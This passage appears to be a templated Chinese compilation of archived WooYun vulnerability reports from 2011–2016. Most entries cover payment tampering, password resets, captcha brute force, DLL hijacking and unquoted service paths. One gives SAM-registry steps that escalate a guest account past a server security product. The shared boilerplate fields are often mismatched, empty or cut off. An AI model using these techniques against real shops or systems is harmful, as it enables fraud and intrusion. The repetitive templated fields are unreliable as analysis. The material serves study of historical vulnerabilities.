**详情**: 类似于WooYun: 国美网上商城支付漏洞1元订购Iphone 4S！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 订单生成时验证商品数量是否小于1
---

---
### [wooyun-2013-041617] 某电脑厂商某积分商城支付漏洞再绕过
**厂商**: 某电脑厂商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 看我怎么用最低的积分换最高积分的礼物的~1. 我先挑选出我最喜欢的礼物，并复制下goods_id=1419f75d406811e3ae7601beb44c5ff72. 选择积分最低的礼物兑换（5积分的杯子），并填好相关信息，抓包修改goods_id替换为1419f75d406811e3ae7601beb44c5ff73. 这里显示兑换成功，虽然显示的是被子兑换成功，但是兑换记录里，就不相同了到这我们心仪的礼物要30积分，我只花5积分就兑换来了，是不是很划算？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 积分参数还是放后台来操作，有goods_id,在后台计算的时候取出并计算，这样会安全些。快送礼物吧、 我稀罕SSD
---

---
### [wooyun-2014-058242] 新版某运营商验证码可被简单识别（验证码识别实例及演示代码）
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 内容安全

**元思考**: 触发信号: 功能测试

**洞察**: 内容安全防护不足，开发者信任前端输入

**测试流程**:
1. 识别内容安全相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新版某运营商验证码可被简单的处理就能识别，识别率接近百分之百，和没有验证码有啥区别呢?这个可以调用用来短信轰炸机一类的恶意平台发送垃圾短信，同样对用户安全造成威胁。

**POC**: 新版某运营商验证码可被简单的处理就能识别，识别率接近百分之百，和没有验证码有啥区别呢?这个可以调用用来短信轰炸机一类的恶意平台发送垃圾短信，同样对用户安全造成威胁。地址：https://example.com/[已脱敏] String GetCheckString(Bitmap bitmap) {UnCodebase ud = new

**绕过**: 直接利用

**修复**: 不要再想什么新花样换验证码了，老老实实用谷歌的，麻花的那类的吧。另外乌云可不可以给个邀请码？第二次提交了，
---

---
### [wooyun-2014-070433] 某性用品商城任意购买(支付漏洞)
**厂商**: 某性用品商城 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点击购买，然后抓包。看到两个414，就是金额。接着我们来修改为1。提交看看可以看到变成1元了，但有可能是假象，最后点击某电商平台支付。嘿嘿，变成1元了，马上买娃娃。只要支付1元就行了，这里我就不演示了。

**POC**: 点击购买，然后抓包。看到两个414，就是金额。接着我们来修改为1。提交看看可以看到变成1元了，但有可能是假象，最后点击某电商平台支付。嘿嘿，变成1元了，马上买娃娃。下面是支付成功的订单，根据单号请取消该订单下面这个订单1分钱支付1千多的商品，请删除

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2011-01611] 某互联网公司我的资讯广告框设计者粗心问题3月16日
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加_blank.....人人皆知人人都懂。。
---

---
### [wooyun-2013-022532] 明腾cms5.0任意修改密码
**厂商**: 明腾cms5.0 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 实例：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020707] iOS系统SSL连接设计小缺陷
**厂商**: 苹果 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如描述.

**POC**: 以paypal网站为例，先ping出其ip地址.然后在iphone上用https连接此ip.由于证书上的名称与ip地址不符，将会引发ssl错误.此时如单击"Continue"，将永久信任此证书，且不可恢复.使用其它应用连接ssl时如遇到错误也将显示此提示.

**绕过**: 直接利用

**修复**: 1.仿照ie的做法，添加清除ssl缓存功能2.用复杂一点的提示
---

---
### [wooyun-2014-073463] 新网购物车支付漏洞可超低价购买
**厂商**: 新网华通信息技术有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我在这里选择了两个云主机一台5,647元一台5,642元在购物车里，我们看到可以选择主机数量，那个数量选了之后有一个ajax的处理这里我找到这个地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 之前已经有曝光类似的问题WooYun: 新网不花钱买云主机而且还能充值哦我只能说你们相关部门的责任心太差，和你们的售后一样的水准。另外你们新版的网站做的还是不错的，希望真的有新面貌呈现给广大用户
---

---
### [wooyun-2014-083752] Win7以上系统360浏览器安全性低于IE（CVE-2014-6332漏洞可直接执行代码）
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 详细的说，Win7以上系统的IE沙箱，使用了主要的2个安全机制：1.完整性机制：使渲染子进程以Low完整性启动，强制限制进程低权限，所有高权限操作请求，通过IE Broker后由主进程实现；而360浏览器虽然使用了IE核心，但是对此功能进行了缩水，没有使用IE的此安全机制；2.虚拟化机制：对文件、注册表的写入操作全部进行了重定向；

**POC**: win7x64上的漏洞证明：win8.1x64上的漏洞证明：

**绕过**: 直接利用

**修复**: 应该对浏览器渲染子进程能够启动的进程进行约束，IE和chrome沙箱的白名单机制可以借鉴。
---

---
### [wooyun-2015-0105688] 某品牌手机VIBE UI部分版本设计缺陷绕过锁屏读所有联系人
**厂商**: 某电脑厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 事情是这样的，老爹充话费冲多了，电信送了他一只某电脑厂商的手机嗯，这就是传说中的充话费送的手机。最近闲着没事就折腾各种手机，反正没啥用，就拿来测测呗。测试机型:A355e测试VUBE UI版本：A355e_S020_20141229测试步骤：向测试手机拨打电话，然后这个时候往上滑动，进入自定义短信回复界面进入短信回复界面以后，在联系人框那里随便输入一个数字，比如一般手机号开头都是1，这样就可以读到所有联系人了受影响的部分机型：A820t、S898t其他的就没再看了，反正很多电信充话费送手机的肯定都有这个问题

**POC**: 证明视频：链接: https://example.com/[已脱敏] 密码: 4qdq

**绕过**: 直接利用

**修复**: 方法一：把逻辑设置为，自定义回复短信的时候需要输入解锁密码方法二：学习某通信厂商的最新系统，把在通话界面实现自定义回复短信的功能用另外的模块实现，在这个模块中只有短信内容框别的什么都没有。
---

---
### [wooyun-2015-0111917] 360安全卫士/极速浏览器/安全浏览器最新版网址安全检查绕过漏洞
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 360极速浏览器、某安全浏览器默认开启网站名片的功能，网站名片在页面刚跳到某地址但并未返回消息或加载完时即可显示该网站名片，此处存在安全风险。360安全卫士网购保镖也存在同样的问题，在页面页面刚跳到某地址但并未返回消息或加载完时即提示该网站安全、360正保护网购安全，此处存在同样的安全风险。风险场景：A页面含有跳转到B的代码，若B页面未加载则依然显示A页面，但网站名片及网购保镖已经提示A页面安全了。利用加载时间（有的长达10多秒）或者一些302等异常跳转可以在A页面上做很多事情，因为360各种提示已经表明该页面是安全的。漏洞利用条件在于寻找加载时间比较长的网址或者异常302跳转，一般5秒及以上的就可以做很多事情了，符合条件的应该不太难找。

**POC**: 以某电商平台为例Fake Taobao<script language="javascript" type="text/javascript">window.location.href="https://example.com/[已脱敏]";</script>以

**绕过**: 直接利用

**修复**: 这个问题应该是一个通用的安全检查问题，可能存在问题的还不止上述范围的产品和业务。在页面未加载成功时即提示该页面安全信息。
---

---
### [wooyun-2016-0191037] P2P理财APP喵喵客任意修改账号密码
**厂商**: 上海广群互联网金融信息服务有限公司 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 验证码只有4位，sign值算法已破1、发送改密验证码：2、爆破验证码，由于涉及算法，自己写代码构造比较方便：修改密码的data格式如下：mobile=13111111111&channel=ios&newPwd=qwert12345&renewPwd=qwert12345&verfiyCode=1268&version=1.0&sign=ef4f3638cf795977ebaf57e3b74ca18e&token=14b08f-03ryi2iS8G-6903103其中，verfiyCode为验证码，4位数字token可重复使用，是否有时效、时效多长未计算，但远大于爆破所需时间。sign是关键，动态的，算法放测试代码里。开100个线程，1分钟内可以搞定，这里只用了13秒。另外还有个奇葩的地方，验证码短信写的时效性是30分钟，这30分钟里，尝试修改了多次密码，每次请求的验证码都是不变的。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强验证码机制
---

---
### [wooyun-2013-033708] 金山毒霸多处DLL文件劫持漏洞（可能被用于提权或后门等）
**厂商**: 金山毒霸 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金山毒霸SP4最新版（版本2013.sp4.0.080215） windows xp sp3环境金山毒霸的几个主程序在运行中会加载几个不存在的DLL文件，导致可能被恶意软件利用进入其进程空间胡做非为。具体见下（不想再分开报告了，打字都嫌累啊）：kxescore.exe进程加载的缺失DLL列表：%ProgramFiles%\Kingsoft\Kingsoft Antivirus\ksinst.dll%ProgramFiles%\Kingsoft\Kingsoft Antivirus\security\ksde\sqlite.dll%ProgramFiles%\Kingsoft\Kingsoft Antivirus\sqlite.dllkxetray.exe进程加载的缺失DLL列表：%ProgramFiles%\Kingsoft\Kingsoft Antivirus\security\ksde

**POC**: 在%ProgramFiles%\Kingsoft目录下构造一个名为"Kingsoft Antivirusksapi.dll"的DLL文件，当电脑重启或金山毒霸重新加载运行kxescore.exe文件时，该DLL文件随即被加载进kxescore.exe进程内。

**绕过**: 直接利用

**修复**: 厂商懂得。
---

---
### [wooyun-2014-087634] 万达某站存在1元支付漏洞
**厂商**: 大连万达集团股份有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大歌星 https://example.com/[已脱敏]

**POC**: 已经证明

**绕过**: 直接利用

**修复**: 加强验证
---

---
### [wooyun-2012-07896] 某电信一分钱续费宽带
**厂商**: 某运营商某省 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不仅仅是湖南电信吧，其他省份应该也差不多。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 客服说会进行升级，也就不多说了。。。
---

---
### [wooyun-2015-0138310] 优乐养车逻辑漏洞可导致1分钱充值1000元（证明可到账）
**厂商**: youlemobi.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接改数据即可，没什么技术含量。实际充值金额已到账。

**POC**: 直接改数据即可，没什么技术含量。实际充值金额已到账。

**绕过**: 直接利用

**修复**: 后台判断是否支付全额！
---

---
### [wooyun-2014-084119] 万达某站存在绕过短信轰炸+url跳转+信息泄露
**厂商**: 大连万达集团股份有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 绕过短信轰炸：万达wifi服务https://example.com/[已脱敏]    万汇网appr参数没做限制，可以跳转到任何网站，包括钓鱼站点https://example.com/[已脱敏]  万达文化旅游规划研究院www.wanda-cti.com/test.php

**POC**: 已经证明

**绕过**: 过滤绕过

**修复**: 厂商应该懂
---

---
### [wooyun-2015-0152436] 法律行政法规草案意见征集系统设计逻辑缺陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/lisms/action/loginAction.do?loginfre=loginfreuserId=test&password=123456&saveTime=nosaveuserId=test1&password=123456&saveTime=nosaveuserId=DEMO&password=123456&saveTime=nosaveuserId=LINK&password=123456&saveTime=nosave

**POC**: userId=test&password=123456&saveTime=nosaveuserId=test1&password=123456&saveTime=nosaveuserId=DEMO&password=123456&saveTime=nosaveuserId=LINK&password=123456&saveTime=nosave

**绕过**: 直接利用

**修复**: userId=test&password=123456&saveTime=nosaveuserId=test1&password=123456&saveTime=nosaveuserId=DEMO&password=123456&saveTime=nosaveuserId=LINK&password
---

---
### [wooyun-2014-061608] 金山保险柜程序锁形同虚设
**厂商**: 金山网络 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1,程序锁2,把我亲爱的快播锁住了。3,确认已锁

**POC**: 安卓系统-->设置-->管理应用程序-->金山隐私保险箱-->强行停止1,强行停止2,成功!

**绕过**: 直接利用

**修复**: 参考:WooYun: 360隐私空间程序锁形同虚设（看我突破看妹纸图片）其实这是逻辑问题，金山应该知道在安卓系统里面权限并不大，就不应该用这个“程序锁”来进行“隐私”的加密。使用程序锁给了用户一个错觉 让用户以为使用程序锁,自己的隐私就安全了 可以放一些隐私的东西了 这是误导用户 反倒会造成用户隐私
---

---
### [wooyun-2015-0141401] 某搜索引擎软件管理可信路径劫持
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞1：调用CreateProcess这个API时，由于没有使用双引号包围参数路径，导致创建进程时路径截断，直接运行C:\Program.exe程序。漏洞2：创建的服务项BDSoftMgrSvc指定的ImagePath由于没有使用双引号包围参数路径，导致服务启动时路径截断，直接以SYSTEM权限运行C:\Program.exe程序。

**POC**: 测试版本：**.**.**.**4（官方最新版本，更新日期为2015-07-13），截图如下：安装某搜索引擎软件管理到操作系统上，随后放一个名为Program.exe的程序到C盘根目录下，比如复制C:\Windows\System32\calc.exe到C:\Program.exe。双击桌面图标打开某搜索引擎软件管理，可以看到先后创建了两个Program.exe进程，其中一个以SYSTEM权限启动，如下图所示：BDSoftMgr的子进程创建参数为（没有双引号）：C:\Program Files\Baidu\BaiduSoftMgr\**.**.**.**4\BDSWAcc.exe 2564 393842 

**绕过**: 截断攻击

**修复**: 请使用双引号包围进程路径，包括CreateProcess的参数以及系统服务项的ImagePath参数。其中CreateProcess的位于BDSWHomePage.dll的sub_5F931870函数中，如下图所示：
---

---
### [wooyun-2011-03899] 某互联网公司将乌云列入黑名单
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看图，不解释。

**POC**: 看图，不解释。

**绕过**: 直接利用

**修复**: 你懂的。
---

---
### [wooyun-2015-0120250] 宝驾租车任意账号密码重置秒改(官方手机号为例测试)
**厂商**: baojia.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 宝驾租车 私家车共享平台，严重的逻辑缺陷，导致可秒改任意账号下面以官方手机号测试，我们从这个页面 https://example.com/[已脱敏] 18811157951首先验证一下手机号是不是已经注册，这个是在重置密码前的，然后 通过https://example.com/[已脱敏] 改为18811157951 后重新发包密码修改为 a123456

**POC**: 宝驾租车 私家车共享平台，严重的逻辑缺陷，导致可秒改任意账号下面以官方手机号测试，我们从这个页面 https://example.com/[已脱敏] 18811157951首先验证一下手机号是不是已经注册，这个是在重置密码前的，然后 通过https://example.com/[已脱敏] 改为18811157951 后重新发包密码修改为 a123456

**绕过**: 直接利用

**修复**: 1 修改密码的请求建议使用POST传值2 修改密码时候需要验证下原密码
---

---
### [wooyun-2015-0160434] 飞行之翼某功能存在设计逻辑缺陷漏洞
**厂商**: 飞行之翼 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购买课程：https://example.com/[已脱敏]"admin"里面，友情测试，并未进行飞币购买课程等操作，请厂商处理

**POC**: 。找回密码：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0150496] 江苏农信银行Android客户端信任任意服务端证书漏洞可被中间人劫持
**厂商**: 江苏农村商业银行 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客户端程序覆盖了google默认的证书检查机制，但未对服务端证书做验证，信任任意主机名称。手机不需要安装代理证书，代理也可查看截获的通信报文，虽然客户端在登录数据做了加密，但服务端返回的数据未做加密保护，导致用户敏感数据泄露。

**POC**: 1.基本信息apk  : com.yitong.mbank, 14, 1.5.2, 江苏农信apkmd5: f05ed1a481e5cf0c916b390f801badd5证书 :certmd5: 0aa3478148ea0f7c68dcda66bca2dd08issuer: C=cn, ST=js, L=nj, O=kfb, OU=jsnx, CN=androidsubject: C=cn, ST=js, L=nj, O=kfb, OU=jsnx, CN=android下载地址：http://**.**.**.**/cn/dzyh/sjyh/90.html2.漏洞分析：通过反编译代码分析，客

**绕过**: 直接利用

**修复**: 建议客户端对服务端证书进行验证，或采取双向认证。
---

---
### [wooyun-2015-0157928] 超好玩主站设计逻辑缺陷重置任意账号密码
**厂商**: 深圳英鹏玩客公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用户资料上能户获取用户邮箱https://example.com/[已脱敏] 123123

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强验证
---

---
### [wooyun-2014-060380] 与知音漫客的一次擦肩而过(任意上传+后台弱口令+支付漏洞大礼包)
**厂商**: zymk.cn | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 几乎每条评论都到几千，某社交平台几万。。。弱口令：https://example.com/[已脱敏] 非常严重把他带到钓鱼网站，呵呵。。。首页弹https://example.com/[已脱敏] 绕过检测一句话上传封面那里上传 jpg;asp这还有一处支付漏洞在购买VIP那里抓包，然后你懂得。。。site：https://example.com/[已脱敏]

**POC**: 各种姿势都用过了。求技巧。。。私聊客服想坑个礼物的，居然一直不在线给个小礼品真的有那么难吗 o(∩_∩)o

**绕过**: 过滤绕过

**修复**: 过滤，过滤。控制，严禁，yes，安全
---

---
### [wooyun-2015-0109711] 某IM软件"安全防护"程序DLL加载未验证漏洞
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前几天某互联网公司更新了7.1版本.然后意外的发现某互联网公司的桌面快捷方式指向的某互联网公司Protect.exe程序居然存在一个使用非系统DLL的导入然后好奇了.作为一个"安全防护"程序,使用导入表导入自定义DLL.这不是找利用? 难道像杀软一样有目录保护?然后copy出来再cpoy进去.成功的丢进去了.所以结论是木有这个自我保护,好吧.现在就已经看到一处摆在明面上的DLL加载问题了.眼睛一扫发现tx使用了zlib.dll和tinyxml.dll 一般很多人在使用这俩DLL的时候都忘记去验证签名.测试下.通过修改版权信息来破坏签名,双击桌面图标,果然成功跑起来了使用XT看下,果然把我们修改过的zlib加载上了(此时其实从安全角度考虑已经无需其他操作了.这情况下弹窗假窗口什么的都可以做了)输入密码登陆.等待10分钟.木有被踢出(说明自身定时检测功能没有涵盖某互联网公司Protect的组件)然后将目录下的zlib.dll

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 在加载DLL时候进行数字签名的验证
---

---
### [wooyun-2015-0165348] 千业商城设计逻辑缺陷/平行权限漏洞打包
**厂商**: 千业商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 把运费更改为-186元http://**.**.**.**/index.php?act=member&op=address&type=edit&id=218把地址id改为218

**POC**: RT

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-026676] 天语手机官网支付漏洞，21元购买3部手机
**厂商**: 天语手机 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、随便购买3部手机，1399x1pc、999x1pc、399x1pc2、将999和399手机的购买数量修改为-1，使其的和等于1元----修改数量----合计金额已经变成1元了3、结算后，加上运费一共为21元，提交订单----一共为21元----订单提交成功4、付款也是21元

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 物品数进行约束
---

---
### [wooyun-2012-014541] 某电商平台手机版 易付宝支付逻辑缺陷
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2012 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 输入支付密码，就完成了订单支付；手机短信校验功能未启用；

**绕过**: 直接利用

**修复**: 同步短信安全校验功能；
---

---
### [wooyun-2011-02956] 某社交平台某社交平台API申请手机号码验证无限发
**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下图手机中可以看出都是同一时间，还有点发送后还有重新发送的按钮。扫描仪效果还不错的那么清晰。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加重新发送的时间。
---

---
### [wooyun-2015-0129063] 某网络书店重要功能存在设计缺陷逻辑错误（已经发货）
**厂商**: 北京图书大厦有限责任公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在优惠券上

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 把我的订单取消掉  不然又让门卫给收了
---

---
### [wooyun-2014-079025] 世纪佳缘某支付业务逻辑问题
**厂商**: 世纪佳缘 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先注册世纪佳缘账号，点击购买邮票看到了吗 本来邮票一张是2元的 捉包这里可以修改成1张1块成功下单就是

**POC**: 先注册世纪佳缘账号，点击购买邮票看到了吗 本来邮票一张是2元的 捉包这里可以修改成1张1块成功下单就是

**绕过**: 直接利用

**修复**: 你们更专业 求礼物
---

---
### [wooyun-2013-025480] 团购王支付漏洞，可成功交易（已证明）
**厂商**: 团购王 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 童鞋们，全部拿起火狐，抓包，去网吧，叫上自己的同学，差不多10人，全部抓包改数据，组队一日游- -求礼品啊~ 厂商，求礼品！！！！！！！！！！！！Rank少给点也行- -

**POC**: 童鞋们，全部拿起火狐，抓包，去网吧，叫上自己的同学，差不多10人，全部抓包改数据，组队一日游- -求礼品啊~ 厂商，求礼品！！！！！！！！！！！！Rank少给点也行- -

**绕过**: 直接利用

**修复**: 你们那边有黑阔技术人员- -
---

---
### [wooyun-2014-046675] 绕过安全狗用户限制提权
**厂商**: 安全狗 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器安全狗，在账户保护全开的状态下，是不可以添加用户的，但是并没有限制查看和修改密码的权限，这个是不容否认的，就算不允许修改密码，也可以读出iis用户密码明文，那么安全狗账户限制就如同虚设~打狗棍法第一式首先，用guest，演示一下，具体操作是通过注册表，篡改sam下用户的F值，使其达到管理权限.首先，你必须有提权的exp,使自己达到system权限,大家都知道,administrator对应值是1F4,GUEST是1F5，如果有例外，下面会讲到。下面是步骤:1.使用net1 user guset 1 ,将guest密码重置为1，无需过问是否禁用2.reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4" "x:\1.reg"导出administrator的注册表值到某路径,修改内容，将"V"值删除，只留

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业。
---

---
### [wooyun-2015-0138181] iOS日历特殊字符串溢出可导致iPhone白苹果（远程拒绝服务）
**厂商**: Apple | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

